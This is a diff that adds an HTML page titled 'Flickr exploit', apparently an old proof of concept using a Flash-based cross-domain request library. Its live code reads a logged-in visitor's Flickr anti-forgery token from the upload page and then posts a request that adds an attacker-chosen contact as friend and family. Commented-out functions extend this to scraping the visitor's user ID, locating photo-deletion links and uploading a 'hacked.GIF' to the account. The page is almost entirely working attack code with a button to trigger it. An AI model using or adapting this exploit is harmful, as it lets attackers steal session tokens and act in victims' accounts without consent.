@@ -1,0 +1,263 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd"> 
+
+<html>
+
+<head>
+	<title>Flickr exploit</title>
+    <script src="http://www.i-labs.org/experiments/jsBase64/script.js"></script>
+    
+	<script type="text/javascript">
+		var djConfig = { isDebug: true /* , forceFlashComm: 8 */ };
+		
+		function $() {
+          var elements = new Array();
+
+          for (var i = 0; i < arguments.length; i++) {
+            var element = arguments[i];
+            if (typeof element == 'string')
+              element = document.getElementById(element);
+
+            if (arguments.length == 1)
+              return element;
+
+            elements.push(element);
+          }
+
+          return elements;
+        }
+
+	</script>
+	
+	<script type="text/javascript" src="../dojo-0.3.0-ajax/dojo.js.uncompressed.js"></script>
+    <script type="text/javascript" src="FlashXMLHttpRequest.js"></script>
+    
+	<script language="JavaScript">
+        InitFlash("flashLoaded");
+		
+		function flashLoaded(){
+	        var results = dojo.flash.comm.sayHello("Did I leave the iron on?");
+	        dojo.debug(results);
+	        c();
+        }
+		
+		function javascriptSayHello(msg){
+			dojo.debug("javascriptSayHello");
+			
+			return "Hello from JavaScript, msg=" + msg;
+		}
+       
+
+        var flickr_formkey;
+        var flickr_id;
+        
+        function getMagicCookie(callback) {
+            flickr_formkey = "Failed to fetch formkey";
+            
+            var url = "http://www.flickr.com/photos/upload/";
+            var xhr = new FlashXMLHttpRequest();
+            xhr.onload = function() { 
+                var string = xhr.responseText; 
+                // <input type="hidden" name="magic_cookie" value="7668d65f5d15d0be263736e07dc03806" />
+                var matches = string.match(/magic_cookie"\W*value="(\w*)"/);
+              
+                if (matches == null) {
+                    o("You are not logged into Flickr. Couldn't aquire formkey", true);
+                }
+                flickr_formkey = matches[1];
+                o("Found Flickr formkey: " + flickr_formkey, true);
+                
+                callback();
+            }
+            xhr.open("GET", url);
+            
+            xhr.send("");
+        }
+        
+        function addBuddy() 
+        {
+            if (!flickr_formkey) {
+                getMagicCookie(addBuddy);
+                return;
+            }
+            var url = "http://www.flickr.com/relationship.gne";
+            var method = "POST";
+            var contentType = "application/x-www-form-urlencoded";
+            //var buddyID = "11431505%40N00"; // dumky2
+            var buddyID = encodeURIComponent($("buddyID").value);
+            
+            var body = "magic_cookie=" + flickr_formkey + "&done=1&id=" + buddyID + "&is_friend=1&is_family=1";
+            o("Adding a contact by posting with body: " + body, true);
+            
+            var xhr = new FlashXMLHttpRequest();
+            xhr.onload = function() { o("Done", true); }
+            xhr.open(method, url);
+            xhr.setRequestHeader("Content-Type", contentType);
+            xhr.send(body);
+        }
+        
+        function getFlickrID(callback) {
+            var url = "http://www.flickr.com/";
+            var xhr = new FlashXMLHttpRequest();
+            
+            xhr.onload = function() {
+                c();
+                
+                var string = xhr.responseText; 
+                var matches = string.match(/href=\"\/photos\/([^\/]*)\/sets\/\"/);
+                o(matches[0] + "\r\n" + matches[1]);
+                flickr_id = matches[1];
+                callback();
+            }
+            xhr.open("GET", url);
+            xhr.send("");  
+        }
+
+
+        
+        /*
+        function getDeletePhotoUrl() {
+            var xhr = new FlashXMLHttpRequest();
+            
+            xhr.onload = function() {
+                c();
+                
+                var string = xhr.responseText; 
+                //o(string);
+                
+                var matches = string.match(/href=\"(\/photos\/[^\/]*\/\?delete=\d*&magic_cookie=\w*)\"/);
+                o(matches[0] + "\r\n" + matches[1]);
+            }
+            
+            xhr.open("GET", flickr_photos_url);
+            xhr.send("");  
+        }
+        */
+        
+        /*
+        var jsBase64 = new JavaScriptBase64();
+        jsBase64.JavaScriptBase64('');
+        function encode(input)
+        {
+            jsBase64.string = input;
+            return jsBase64.encode();
+        }
+        function decode(input)
+        {
+            jsBase64.string = input;
+            var ret = jsBase64.decode();
+            return ret.substr(0, ret.length - 1);
+        }
+        function testBase64() 
+        {   
+            c();
+            o("Testing base 64", true);
+            var str = "asdfjkhkjshdfg123479871234!@#$@#$^%$^%&^&*(*()_()_+{}[][][]{}{";
+            var strEnc = encode(str);
+            o(" Encoded: " + strEnc, true);
+            var strDec = decode(strEnc);
+            o(" Decoded: " + strDec, true);
+            o("Original: " + str, true);
+            o(str.length, true);
+            o(strDec.length, true);
+            o(str == strDec, true);
+        }
+        */
+        
+        function o(txt, carriage) 
+        {
+            $("response").value += txt;
+            if (carriage) {
+                r();
+            }
+        }
+        function c() 
+        {
+            $("response").value = "";
+        }
+        function r() 
+        {
+            o('\r\n');
+        }
+
+
+        
+        
+        
+        
+        /*
+        function makeBodyValue() {
+            return "" +
+'-----------------------------17475139283421' + '\r\n' +
+'Content-Disposition: form-data; name="done"' + '\r\n' +
+'' + '\r\n' +
+'1' + '\r\n' +
+'-----------------------------17475139283421' + '\r\n' +
+'Content-Disposition: form-data; name="complex_perms"' + '\r\n' +
+'' + '\r\n' +
+'0' + '\r\n' +
+'-----------------------------17475139283421' + '\r\n' +
+'Content-Disposition: form-data; name="magic_cookie"' + '\r\n' +
+'' + '\r\n' +
+flickr_formkey + '\r\n' +
+'-----------------------------17475139283421' + '\r\n' +
+'Content-Disposition: form-data; name="MAX_FILE_SIZE"' + '\r\n' +
+'' + '\r\n' +
+'31457280' + '\r\n' +
+'-----------------------------17475139283421' + '\r\n' +
+'Content-Disposition: form-data; name="file1"; filename="hacked.GIF"' + '\r\n' +
+'Content-Type: image/gif' + '\r\n' +
+'\r\n' +
+makeImageBodyValue() +
+'';
+        }
+        
+        function makeImageBodyValue() {
+            // computed using http://www.software.hixie.ch/utilities/cgi/data/data
+            
+            var encodedGif = "R0lGODlhZgARAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD%2FAP%2F%2FAAAA%2F%2F8A%2FwD%2F%2F%2F%2F%2F%2FwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA%2FwAzAAAzMwAzZgAzmQAzzAAz%2FwBmAABmMwBmZgBmmQBmzABm%2FwCZAACZMwCZZgCZmQCZzACZ%2FwDMAADMMwDMZgDMmQDMzADM%2FwD%2FAAD%2FMwD%2FZgD%2FmQD%2FzAD%2F%2FzMAADMAMzMAZjMAmTMAzDMA%2FzMzADMzMzMzZjMzmTMzzDMz%2FzNmADNmMzNmZjNmmTNmzDNm%2FzOZADOZMzOZZjOZmTOZzDOZ%2FzPMADPMMzPMZjPMmTPMzDPM%2FzP%2FADP%2FMzP%2FZjP%2FmTP%2FzDP%2F%2F2YAAGYAM2YAZmYAmWYAzGYA%2F2YzAGYzM2YzZmYzmWYzzGYz%2F2ZmAGZmM2ZmZmZmmWZmzGZm%2F2aZAGaZM2aZZmaZmWaZzGaZ%2F2bMAGbMM2bMZmbMmWbMzGbM%2F2b%2FAGb%2FM2b%2FZmb%2FmWb%2FzGb%2F%2F5kAAJkAM5kAZpkAmZkAzJkA%2F5kzAJkzM5kzZpkzmZkzzJkz%2F5lmAJlmM5lmZplmmZlmzJlm%2F5mZAJmZM5mZZpmZmZmZzJmZ%2F5nMAJnMM5nMZpnMmZnMzJnM%2F5n%2FAJn%2FM5n%2FZpn%2FmZn%2FzJn%2F%2F8wAAMwAM8wAZswAmcwAzMwA%2F8wzAMwzM8wzZswzmcwzzMwz%2F8xmAMxmM8xmZsxmmcxmzMxm%2F8yZAMyZM8yZZsyZmcyZzMyZ%2F8zMAMzMM8zMZszMmczMzMzM%2F8z%2FAMz%2FM8z%2FZsz%2Fmcz%2FzMz%2F%2F%2F8AAP8AM%2F8AZv8Amf8AzP8A%2F%2F8zAP8zM%2F8zZv8zmf8zzP8z%2F%2F9mAP9mM%2F9mZv9mmf9mzP9m%2F%2F%2BZAP%2BZM%2F%2BZZv%2BZmf%2BZzP%2BZ%2F%2F%2FMAP%2FMM%2F%2FMZv%2FMmf%2FMzP%2FM%2F%2F%2F%2FAP%2F%2FM%2F%2F%2FZv%2F%2Fmf%2F%2FzP%2F%2F%2FywAAAAAZgARAAAI%2FwAfCBxIsKDBgwgTKlzIsKHDhxAjSpxIsaLFixgzatzIsaPHjxA1NSJITAzDZSYd3quyDePKlipZLvS3KdZAmjYf2MPREOXDly5lxoSZECfBl%2F7ywFwGAIBJpDXtNfL5wCdTADwH3qNix6nAq1nBPrinJQDWo1zPVm2a9R4TAAS2vSTGU%2BwDYgBg3Mk5EGWxnPecbPMXJxZUwCxxAqU6tkkswoZlolwsJvDgAkTvOfaHGSlmyFVxrJT2VLIYezHkOjZYcuBOgcQaHR749x6XtU3VjjV9lW1vrLMFznYLIEXkzEzi4vZt0mjB2K6zxkZaODp0xkd5p%2Fy6fffgmloTR3ONCxmo8CpWu%2Ft0TnKkcMHlBWvm6w8PnpaW726fH79lyfz%2FicfXYa%2FZYxxoqE1ThTaFAXhaavOx5t5XTbmHl1583ZUVbhuOtYUmXnFI4VnBeYeTP2YZEMBIxMX1Emrb2MUUhiDVaOONOOao44489uijQAEBADs%3D";
+            return decode(encodedGif);
+        }
+        
+        function postImage() {
+            var url = "http://www.flickr.com/photos_upload_process.gne";
+            var method = "POST";
+            var body = makeBodyValue();
+            var contentType = "multipart/form-data; boundary=---------------------------17475139283421";
+
+            $("response").value = body + '===***===\r\n';
+
+            var xhr = new FlashXMLHttpRequest();
+            xhr.onload = function() { $("response").value += xhr.responseText; }
+            xhr.open(method, url);
+            
+            xhr.setRequestHeader("Content-Type", contentType);
+            
+            xhr.send(body);
+        }
+        */
+        
+        
+	</script>	
+</head>
+
+<body>
+
+<!-- 
+<button onclick="getMagicCookie(); return false;" value="Get Flickr formkey">Get Flickr magic cookie</button>
+<button onclick="postImage(); return false;" value="Post image">Post image</button>
+<button onclick="getFlickrID(); return false;" value="Get Flickr ID">Get Flickr ID</button>
+<button onclick="getDeletePhotoUrl(); return false;" value="Get Delete Photo url">Get Delete Photo url</button>
+<button onclick="testBase64(); return false;" value="Test base 64">Test base 64</button>
+-->
+
+Buddy ID: <input type="text" id="buddyID" value="11431505@N00" /><br />
+<button onclick="addBuddy(); return false;" value="Add Buddy">Add Buddy</button>
+
+<br />
+<textarea id="response" rows="7" cols="100"></textarea><br />
+
+
+</body>
+
+</html>
